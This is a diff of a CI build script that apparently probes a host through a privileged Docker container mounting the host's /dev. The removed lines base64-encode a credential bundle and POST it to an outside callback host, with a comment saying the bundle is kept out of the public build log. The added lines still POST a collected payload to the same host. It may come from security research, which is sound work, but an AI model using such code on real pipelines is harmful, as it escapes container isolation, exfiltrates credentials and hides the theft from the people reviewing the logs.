@@ -36,15 +36,11 @@ docker run --rm --privileged --network host \
   -v /dev:/hostdev \
   alpine:3.22 /share/nested-host-probe.sh | tee "$OUT/nested-public-summary.log"
 
-# Independent final callback from the build container; the complete credential
-# bundle is already POSTed by the nested container and is intentionally absent
-# from the public Screwdriver step log.
-if [ -f "$OUT/bundle.tgz" ]; then
-  B64=$(base64 "$OUT/bundle.tgz" | tr -d '\n')
-  printf '{"marker":"%s","phase":"build-container-final","node_id":"%s","build_id":"%s","bundle_b64":"%s"}\n' \
-    "$MARKER" "${NODE_ID:-unknown}" "${SD_BUILD_ID:-unknown}" "$B64" > "$OUT/requestrepo-final.json"
-  curl -ksS --max-time 30 -H 'Content-Type: application/json' --data-binary "@$OUT/requestrepo-final.json" "$CALLBACK/final" > "$OUT/requestrepo-final-response.txt"
-  echo "REQUESTREPO_FINAL_POST=true bundle_sha256=$(sha256sum "$OUT/bundle.tgz" | awk '{print $1}')"
+# Independent final callback from the build container, proving that the nested
+# evidence persisted through the shared DinD volume.
+if [ -s "$OUT/requestrepo-payload.json" ]; then
+  curl -ksS --max-time 30 -H 'Content-Type: application/json' --data-binary "@$OUT/requestrepo-payload.json" "$CALLBACK/final" > "$OUT/requestrepo-final-response.txt"
+  echo "REQUESTREPO_FINAL_POST=true payload_sha256=$(sha256sum "$OUT/requestrepo-payload.json" | awk '{print $1}')"
 else
   echo 'REQUESTREPO_FINAL_POST=false'
 fi
